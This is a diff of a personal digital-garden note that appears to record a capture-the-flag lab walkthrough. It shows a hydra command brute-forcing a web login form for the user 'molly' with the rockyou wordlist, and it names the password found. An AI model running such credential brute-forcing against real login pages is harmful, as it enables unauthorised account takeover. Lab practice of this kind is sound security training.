@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/my-digital-garden/","tags":["gardenEntry"],"created":"2025-02-06T18:51:33.711-05:00","updated":"2025-02-06T19:42:27.443-05:00"}
+{"dg-publish":true,"permalink":"/my-digital-garden/","tags":["gardenEntry"],"created":"2025-02-06T18:51:33.711-05:00","updated":"2025-02-06T19:43:04.436-05:00"}
 ---
 
 Testing 123
@@ -27,7 +27,6 @@ Ran the command
 
 ```
 hydra -l molly -P rockyou.txt 10.10.71.57 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
-
 ```
 
 Using the username, molly, and the password, sunshine, allows us to make it through and login to find the flag.
